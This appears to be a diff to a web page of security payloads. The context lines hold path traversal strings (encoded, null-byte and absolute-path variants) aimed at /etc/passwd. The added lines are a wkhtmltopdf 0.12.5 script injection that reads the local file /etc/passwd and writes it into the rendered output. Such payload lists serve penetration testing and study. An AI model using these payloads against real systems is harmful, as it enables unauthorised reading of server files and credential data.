@@ -2199,6 +2199,14 @@ test
 ..%252f..%252f..%252fetc/passwd
 /var/www/images/../../../etc/passwd
 ../../../etc/passwd%00.png
+
+# wkhtmltopdf 0.12.5:
+&lt;script>
+    x = new XMLHttpRequest();
+    x.open('GET', 'file:///etc/passwd', false);
+    x.send();
+    document.write('&lt;pre>' + x.responseText + '&lt;/pre>');
+&lt;/script>
 </code></pre></div></div>
 <hr>
 
